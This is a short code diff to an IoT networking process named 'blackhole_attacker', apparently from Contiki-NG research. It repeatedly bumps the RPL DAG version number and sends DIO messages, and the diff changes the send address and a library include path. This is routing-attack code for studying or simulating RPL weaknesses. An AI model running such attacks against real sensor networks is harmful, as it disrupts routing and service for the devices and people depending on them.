@@ -4,7 +4,7 @@
 #include "net/netstack.h"
 #include <stdint.h>
 #include <inttypes.h>
-#include "net/routing/rpl-lite/rpl.h"
+#include "custom-lib/rpl-lite/rpl.h"
 #include "net/packetbuf.h"
 #include "net/ipv6/uipbuf.h"
 #include "net/ipv6/uip-icmp6.h"
@@ -43,7 +43,8 @@ PROCESS_THREAD(blackhole_attacker, ev, data)
       && NETSTACK_ROUTING.get_root_ipaddr(&root_ipaddr))
     {
       curr_instance.dag.version = (curr_instance.dag.version + 1) % 256;
-      rpl_icmp6_dio_output(&rpl_multicast_addr);
+      rpl_icmp6_dio_output(NULL);
+      // rpl_icmp6_dio_output(&rpl_multicast_addr);
       LOG_INFO("Sent DIO with version number: %d\n", curr_instance.dag.version);
     }
     else {
